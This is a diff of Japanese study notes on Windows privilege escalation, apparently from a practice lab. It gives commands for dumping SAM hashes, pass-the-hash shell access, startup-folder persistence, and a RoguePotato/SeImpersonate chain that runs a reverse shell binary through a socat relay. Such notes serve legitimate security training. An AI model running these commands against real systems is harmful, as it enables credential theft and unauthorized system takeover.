@@ -80,5 +80,24 @@ python3 ../bin/secretdump.py -sam SAM -system SYSTEM LOCAL
 以下のコマンドでハッシュ値のみで、cmd プロンプトを操作可能
 pth-winexe -U 'admin%<hash>' //10.10.236.247 cmd.exe
 
+【8. タスクスケジュール】★もう少し深堀必要
+・方法
+登録されているタスクを書き換える
 
+【9. Admin 権限で起動するプログラム】★どうやって探すのか？
+・方法
+Admin 権限で実行中のアプリから、「ファイル」などのメニューで、cmd.exe を実行
+
+【10. スタートメニューへの登録】
+・方法
+以下、スタートメニューにショートカットを作成して、リモートシェルを起動するようにする
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+【11. リモートデスクトップの悪用】
+・方法
+SeImpersonatePrivilege と SeAssignPrimaryTokenPrivilege を利用
+
+sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+C:\PrivEsc\RoguePotato.exe -r <MACHINE_IP> -e "C:\PrivEsc\reverse.exe" -l 9999
 
